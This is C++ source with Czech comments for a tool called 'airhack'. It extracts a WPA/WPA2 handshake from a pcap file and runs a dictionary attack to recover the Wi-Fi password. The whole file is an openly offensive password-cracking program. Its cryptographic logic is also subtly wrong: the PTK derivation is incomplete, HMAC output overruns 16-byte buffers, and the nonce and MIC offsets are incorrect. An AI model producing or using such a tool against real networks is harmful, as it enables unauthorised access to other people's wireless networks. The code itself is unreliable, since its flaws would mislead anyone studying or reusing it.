#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstring>
#include <pcap.h>
#include <openssl/hmac.h>
#include <openssl/evp.h>
#include <openssl/sha.h>

// Konstanty
#define EAPOL_TYPE 0x888e
#define MIC_LENGTH 16
#define PMK_LENGTH 32
#define ANONCE_LENGTH 32
#define SNONCE_LENGTH 32
#define MAC_ADDR_LENGTH 6

// Funkce pro generování PMK pomocí PBKDF2
std::vector<unsigned char> derive_pmk(const std::string &ssid, const std::string &password) {
    std::vector<unsigned char> pmk(PMK_LENGTH);
    PKCS5_PBKDF2_HMAC_SHA1(
        password.c_str(), password.size(),
        reinterpret_cast<const unsigned char *>(ssid.c_str()), ssid.size(),
        4096, PMK_LENGTH, pmk.data());
    return pmk;
}

// Funkce pro generování PTK
std::vector<unsigned char> derive_ptk(const std::vector<unsigned char> &pmk,
                                      const std::vector<unsigned char> &anonce,
                                      const std::vector<unsigned char> &snonce,
                                      const std::vector<unsigned char> &ap_mac,
                                      const std::vector<unsigned char> &client_mac) {
    std::vector<unsigned char> data;
    if (ap_mac < client_mac) {
        data.insert(data.end(), ap_mac.begin(), ap_mac.end());
        data.insert(data.end(), client_mac.begin(), client_mac.end());
    } else {
        data.insert(data.end(), client_mac.begin(), client_mac.end());
        data.insert(data.end(), ap_mac.begin(), ap_mac.end());
    }

    if (anonce < snonce) {
        data.insert(data.end(), anonce.begin(), anonce.end());
        data.insert(data.end(), snonce.begin(), snonce.end());
    } else {
        data.insert(data.end(), snonce.begin(), snonce.end());
        data.insert(data.end(), anonce.begin(), anonce.end());
    }

    std::vector<unsigned char> ptk(16);
    unsigned int len = 0;
    HMAC(EVP_sha1(), pmk.data(), pmk.size(), data.data(), data.size(), ptk.data(), &len);
    return ptk;
}

// Funkce pro validaci MIC
bool validate_mic(const std::vector<unsigned char> &ptk,
                  const std::vector<unsigned char> &mic,
                  const std::vector<unsigned char> &eapol_frame) {
    std::vector<unsigned char> eapol_mic(eapol_frame);
    std::fill(eapol_mic.end() - MIC_LENGTH, eapol_mic.end(), 0);

    unsigned char calculated_mic[MIC_LENGTH];
    unsigned int len = 0;
    HMAC(EVP_sha1(), ptk.data(), ptk.size(), eapol_mic.data(), eapol_mic.size(), calculated_mic, &len);

    return std::equal(mic.begin(), mic.end(), calculated_mic);
}

// Extrakce handshaku z PCAP souboru
bool extract_handshake(const std::string &pcap_file,
                       std::vector<unsigned char> &ap_mac,
                       std::vector<unsigned char> &client_mac,
                       std::vector<unsigned char> &anonce,
                       std::vector<unsigned char> &snonce,
                       std::vector<unsigned char> &mic,
                       std::vector<unsigned char> &eapol_frame) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_offline(pcap_file.c_str(), errbuf);
    if (!handle) {
        std::cerr << "[-] Chyba při čtení PCAP souboru: " << errbuf << std::endl;
        return false;
    }

    struct pcap_pkthdr *header;
    const u_char *packet;
    int ret;

    while ((ret = pcap_next_ex(handle, &header, &packet)) >= 0) {
        if (ret == 0) continue; // Timeout
        // Kontrola typu rámce
        if (ntohs(*(uint16_t *)(packet + 12)) == EAPOL_TYPE) {
            const u_char *src_mac = packet + 6;
            const u_char *dst_mac = packet;

            // Získání ANonce/SNonce
            const u_char *payload = packet + 14; // Ethernet header size
            if (anonce.empty()) {
                ap_mac.assign(src_mac, src_mac + MAC_ADDR_LENGTH);
                client_mac.assign(dst_mac, dst_mac + MAC_ADDR_LENGTH);
                anonce.assign(payload + 13, payload + 45);
            } else if (snonce.empty()) {
                snonce.assign(payload + 13, payload + 45);
                mic.assign(payload + header->len - MIC_LENGTH, payload + header->len);
                eapol_frame.assign(payload, payload + header->len);
                break;
            }
        }
    }

    pcap_close(handle);

    return !(ap_mac.empty() || client_mac.empty() || anonce.empty() || snonce.empty() || mic.empty() || eapol_frame.empty());
}

// Zkouška hesla
bool try_password(const std::string &password, const std::string &ssid,
                  const std::vector<unsigned char> &ap_mac,
                  const std::vector<unsigned char> &client_mac,
                  const std::vector<unsigned char> &anonce,
                  const std::vector<unsigned char> &snonce,
                  const std::vector<unsigned char> &mic,
                  const std::vector<unsigned char> &eapol_frame) {
    auto pmk = derive_pmk(ssid, password);
    auto ptk = derive_ptk(pmk, anonce, snonce, ap_mac, client_mac);
    return validate_mic(ptk, mic, eapol_frame);
}

// Slovníkový útok
void crack_password(const std::string &pcap_file, const std::string &wordlist, const std::string &ssid) {
    std::vector<unsigned char> ap_mac, client_mac, anonce, snonce, mic, eapol_frame;

    if (!extract_handshake(pcap_file, ap_mac, client_mac, anonce, snonce, mic, eapol_frame)) {
        std::cerr << "[-] Nepodařilo se extrahovat handshake." << std::endl;
        return;
    }

    std::ifstream wordlist_file(wordlist);
    if (!wordlist_file) {
        std::cerr << "[-] Nepodařilo se otevřít soubor se slovníkem." << std::endl;
        return;
    }

    std::string password;
    while (std::getline(wordlist_file, password)) {
        if (try_password(password, ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_frame)) {
            std::cout << "[+] Heslo nalezeno: " << password << std::endl;
            return;
        }
    }

    std::cout << "[-] Heslo nenalezeno ve zvoleném slovníku." << std::endl;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        std::cerr << "Použití: airhack <pcap soubor> <slovník> <SSID>" << std::endl;
        return 1;
    }

    std::string pcap_file = argv[1];
    std::string wordlist = argv[2];
    std::string ssid = argv[3];

    crack_password(pcap_file, wordlist, ssid);
    return 0;
}
